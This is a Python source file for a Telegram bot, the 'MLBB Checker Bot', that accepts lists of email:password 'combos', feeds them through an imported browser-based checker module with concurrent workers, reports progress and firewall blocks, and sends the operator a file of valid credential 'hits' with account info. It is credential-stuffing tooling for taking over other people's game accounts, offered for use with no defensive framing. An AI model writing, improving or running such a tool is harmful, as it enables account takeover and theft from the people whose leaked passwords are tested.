import asyncio
import io
import os
import sys
import tempfile
import threading
import time
from pathlib import Path

# Note: PLAYWRIGHT_BROWSERS_PATH is set by the Dockerfile ENV (=/ms-playwright).
# Do NOT hardcode /root/.cache/ms-playwright here.

import upass3 as checker

from telegram import Update
from telegram.constants import ChatAction, ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ---------------------------------------------------------------- logging ----
DEBUG = os.environ.get("DEBUG", "1") == "1"


def dbg(tag, *a):
    if not DEBUG:
        return
    msg = " ".join(str(x) for x in a)
    print(f"[{tag}] {msg}", flush=True)


# ---------------------------------------------------------------- config -----
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ALLOWED_USERS = {
    int(x) for x in os.environ.get("ALLOWED_USERS", "").replace(" ", "").split(",")
    if x.strip().isdigit()
}
MAX_CONCURRENT_JOBS = int(os.environ.get("MAX_CONCURRENT_JOBS", "1"))

JOBS: dict[int, list] = {}
JOBS_LOCK = threading.Lock()


class JobCancelled(Exception):
    pass


# ---------------------------------------------------------------- helpers ----
def is_allowed(user_id: int) -> bool:
    if not ALLOWED_USERS:
        return True
    return user_id in ALLOWED_USERS


def parse_combos_from_text(text: str):
    out = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" in line:
            a, p = line.split(":", 1)
        elif "|" in line:
            a, p = line.split("|", 1)
        else:
            continue
        a, p = a.strip(), p.strip()
        if a and p:
            out.append((a, p))
    return out


# ---------------------------------------------------------------- job --------
class Job:
    def __init__(self, job_id, user_id, chat_id, combos, workers, with_info,
                 app, loop, status_msg_id):
        self.job_id = job_id
        self.user_id = user_id
        self.chat_id = chat_id
        self.combos = combos
        self.workers = workers
        self.with_info = with_info
        self.app = app
        self.loop = loop
        self.status_msg_id = status_msg_id
        self._cancel = threading.Event()
        self.results = []
        self.started = time.time()
        self.finished_at = None
        self.state = "starting"
        self.thread = threading.Thread(
            target=self._run, name=f"job-{job_id}", daemon=True
        )

    def cancel(self):
        dbg("job", f"{self.job_id} cancel requested")
        self._cancel.set()

    def is_cancelled(self):
        return self._cancel.is_set()

    def start(self):
        dbg("job", f"{self.job_id} starting thread")
        self.thread.start()

    def _safe_send(self, text, parse_mode=None):
        try:
            asyncio.run_coroutine_threadsafe(
                self.app.bot.send_message(
                    chat_id=self.chat_id, text=text, parse_mode=parse_mode
                ),
                self.loop,
            ).result(timeout=30)
        except Exception as e:
            dbg("tg", f"send failed: {e}")

    def _edit_status(self, text):
        try:
            asyncio.run_coroutine_threadsafe(
                self.app.bot.edit_message_text(
                    chat_id=self.chat_id, message_id=self.status_msg_id,
                    text=text, parse_mode=ParseMode.MARKDOWN,
                ),
                self.loop,
            ).result(timeout=30)
        except Exception as e:
            dbg("tg", f"edit failed: {e}")

    def _run(self):
        dbg("job", f"{self.job_id} thread alive")
        try:
            self._run_checker()
            self.state = "done"
        except JobCancelled:
            self.state = "cancelled"
            dbg("job", f"{self.job_id} cancelled")
            self._safe_send(f"🛑 Job `{self.job_id}` cancelled.")
        except Exception as e:
            self.state = "error"
            dbg("job", f"{self.job_id} crashed: {e!r}")
            self._safe_send(f"❌ Job `{self.job_id}` crashed: `{e}`",
                            parse_mode=ParseMode.MARKDOWN)
        finally:
            self.finished_at = time.time()
            with JOBS_LOCK:
                lst = JOBS.get(self.user_id, [])
                if self in lst:
                    lst.remove(self)
            dbg("job", f"{self.job_id} thread exit")

    def _run_checker(self):
        dbg("job", f"{self.job_id} creating tmp files")
        tmpdir = Path(tempfile.mkdtemp(prefix=f"mlchk_{self.job_id}_"))
        combo_path = tmpdir / "combos.txt"
        result_path = tmpdir / "results.txt"
        combo_path.write_text(
            "\n".join(f"{a}:{p}" for a, p in self.combos), encoding="utf-8"
        )
        dbg("job", f"{self.job_id} combos={len(self.combos)} workers={self.workers}")

        original_login = checker.Checker.login
        parent = self

        def patched_login(self_c, account, password):
            if parent.is_cancelled():
                dbg("chk", f"{parent.job_id} cancel seen before {account}")
                raise JobCancelled()
            t0 = time.time()
            dbg("chk", f"{parent.job_id} -> {account}")
            r = original_login(self_c, account, password)
            dt = time.time() - t0
            parent.results.append(r)
            dbg("chk", f"{parent.job_id} <- {account} {r.status} in {dt:.2f}s")

            if parent.is_cancelled():
                raise JobCancelled()

            done = len(parent.results)
            total = len(parent.combos)
            elapsed = time.time() - parent.started
            rate = done / elapsed if elapsed > 0 else 0
            eta = (total - done) / rate if rate > 0 else 0
            icon = {"valid": "✅", "invalid": "❌", "waf": "🛡",
                    "timeout": "⏱", "no_browser": "🚫",
                    "browser_crash": "💥", "net_error": "🌐"}.get(r.status, "•")
            parent._edit_status(
                f"*Job {parent.job_id}* `{done}/{total}`\n"
                f"Last: {icon} `{r.account}` → *{r.status}*\n"
                f"Rate: `{rate:.2f}/s` • ETA: `{eta:.0f}s`"
            )
            return r

        checker.Checker.login = patched_login
        try:
            dbg("job", f"{self.job_id} calling checker.run")
            checker.run(
                infile=combo_path,
                outfile=result_path,
                workers=self.workers,
                headless=True,
                with_info=self.with_info,
                devices_file=str(tmpdir / "devices.txt"),
            )
            dbg("job", f"{self.job_id} checker.run returned")
        finally:
            checker.Checker.login = original_login

        self._send_results()

    def _send_results(self):
        counts = {}
        for r in self.results:
            counts[r.status] = counts.get(r.status, 0) + 1

        elapsed = time.time() - self.started
        lines = [
            f"*Job {self.job_id} complete*",
            f"Checked: `{len(self.results)}`",
            f"Valid: `{counts.get('valid', 0)}`",
            f"Invalid: `{counts.get('invalid', 0)}`",
            f"WAF: `{counts.get('waf', 0)}`",
            f"Timeout: `{counts.get('timeout', 0)}`",
            f"No browser: `{counts.get('no_browser', 0)}`",
            f"Net error: `{counts.get('net_error', 0)}`",
            f"Time: `{elapsed:.1f}s`",
        ]
        self._edit_status("\n".join(lines))

        valid = [r for r in self.results if r.status == "valid"]
        if valid:
            txt = "\n".join(
                f"{r.account}:{r.password}" + (f" | {r.info}" if r.info else "")
                for r in valid
            )
            buf = io.BytesIO(txt.encode("utf-8"))
            buf.name = "valid.txt"
            try:
                asyncio.run_coroutine_threadsafe(
                    self.app.bot.send_document(
                        chat_id=self.chat_id, document=buf,
                        caption=f"✅ {len(valid)} valid hits",
                    ),
                    self.loop,
                ).result(timeout=60)
            except Exception as e:
                dbg("tg", f"send valid.txt failed: {e}")

        import csv as _csv
        csv_buf = io.StringIO()
        w = _csv.writer(csv_buf)
        w.writerow(["account", "password", "status", "info"])
        for r in self.results:
            w.writerow([r.account, r.password, r.status, r.info])
        data = io.BytesIO(csv_buf.getvalue().encode("utf-8"))
        data.name = "results.csv"
        try:
            asyncio.run_coroutine_threadsafe(
                self.app.bot.send_document(
                    chat_id=self.chat_id, document=data, caption="📄 Full results"
                ),
                self.loop,
            ).result(timeout=60)
        except Exception as e:
            dbg("tg", f"send results.csv failed: {e}")


# ---------------------------------------------------------------- commands ---
WELCOME = (
    "*MLBB Checker Bot*\n\n"
    "Send me a `.txt` file with combos, or paste them.\n"
    "Format: `email:password` (one per line)\n\n"
    "*Commands*\n"
    "/start — show this\n"
    "/check — instructions\n"
    "/info — toggle info fetch\n"
    "/workers N — set workers (1–10)\n"
    "/status — running jobs\n"
    "/cancel — cancel all your jobs\n"
    "/debug — toggle verbose console logging\n"
)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("⛔ Not authorized.")
        return
    ctx.user_data.setdefault("with_info", False)
    ctx.user_data.setdefault("workers", 3)
    dbg("tg", f"/start from {update.effective_user.id}")
    await update.message.reply_text(WELCOME, parse_mode=ParseMode.MARKDOWN)


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    await update.message.reply_text(
        "Send a `.txt` file or paste combos (`email:password` per line)."
    )


async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    cur = ctx.user_data.get("with_info", False)
    ctx.user_data["with_info"] = not cur
    await update.message.reply_text(
        f"Info fetch: *{'ON' if not cur else 'OFF'}*",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_workers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_text("Usage: `/workers 3`",
                                        parse_mode=ParseMode.MARKDOWN)
        return
    try:
        n = int(ctx.args[0]); assert 1 <= n <= 10
    except Exception:
        await update.message.reply_text("Workers must be 1–10.")
        return
    ctx.user_data["workers"] = n
    await update.message.reply_text(f"Workers set to *{n}*",
                                    parse_mode=ParseMode.MARKDOWN)


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    with JOBS_LOCK:
        jobs = JOBS.get(update.effective_user.id, [])
    if not jobs:
        await update.message.reply_text("No running jobs.")
        return
    now = time.time()
    lines = []
    for j in jobs:
        done = len(j.results); total = len(j.combos)
        lines.append(
            f"• `{j.job_id}` {j.state} `{done}/{total}` "
            f"({now - j.started:.0f}s)"
        )
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    with JOBS_LOCK:
        jobs = list(JOBS.get(update.effective_user.id, []))
    for j in jobs:
        j.cancel()
    await update.message.reply_text(f"Cancelling {len(jobs)} job(s).")


async def cmd_debug(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    global DEBUG
    DEBUG = not DEBUG
    await update.message.reply_text(
        f"Console debug: *{'ON' if DEBUG else 'OFF'}*",
        parse_mode=ParseMode.MARKDOWN,
    )


# ---------------------------------------------------------------- dispatch ---
_JOB_SEQ = 0


async def _start_job(update, ctx, combos):
    global _JOB_SEQ
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    with JOBS_LOCK:
        running = JOBS.get(user_id, [])
        if len(running) >= MAX_CONCURRENT_JOBS:
            await update.message.reply_text(
                f"⏳ You already have {len(running)} running job(s)."
            )
            return
        _JOB_SEQ += 1
        job_id = f"j{_JOB_SEQ}"

    workers = ctx.user_data.get("workers", 3)
    with_info = ctx.user_data.get("with_info", False)

    dbg("tg", f"starting {job_id} combos={len(combos)} workers={workers} info={with_info}")

    msg = await update.message.reply_text(
        f"🚀 *{job_id}* starting\n"
        f"Combos: `{len(combos)}`\n"
        f"Workers: `{workers}`\n"
        f"Info: `{'ON' if with_info else 'OFF'}`",
        parse_mode=ParseMode.MARKDOWN,
    )

    loop = asyncio.get_running_loop()
    job = Job(
        job_id=job_id, user_id=user_id, chat_id=chat_id, combos=combos,
        workers=workers, with_info=with_info,
        app=ctx.application, loop=loop, status_msg_id=msg.message_id,
    )
    with JOBS_LOCK:
        JOBS.setdefault(user_id, []).append(job)
    job.start()


async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    doc = update.message.document
    if not doc:
        return
    dbg("tg", f"document {doc.file_name} from {update.effective_user.id}")
    await update.message.chat.send_action(ChatAction.TYPING)
    f = await doc.get_file()
    data = await f.download_as_bytearray()
    text = data.decode("utf-8", errors="ignore")
    combos = parse_combos_from_text(text)
    dbg("tg", f"parsed {len(combos)} combos from file")
    if not combos:
        await update.message.reply_text("No valid combos in file.")
        return
    await _start_job(update, ctx, combos)


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    text = update.message.text or ""
    combos = parse_combos_from_text(text)
    dbg("tg", f"text message, parsed {len(combos)} combos")
    if not combos:
        await update.message.reply_text(
            "No valid combos. Send `email:password` per line.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    await _start_job(update, ctx, combos)


async def on_error(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    dbg("tg", f"handler error: {ctx.error!r}")


# ---------------------------------------------------------------- main -------
def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var is required")
    dbg("main", f"python={sys.version.split()[0]}")
    dbg("main", f"allowed_users={ALLOWED_USERS or 'ALL'}")
    dbg("main", f"max_concurrent={MAX_CONCURRENT_JOBS}")
    dbg("main", f"playwright_path={os.environ.get('PLAYWRIGHT_BROWSERS_PATH', '<unset>')}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("info", cmd_info))
    app.add_handler(CommandHandler("workers", cmd_workers))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("debug", cmd_debug))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)

    dbg("main", "starting polling")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()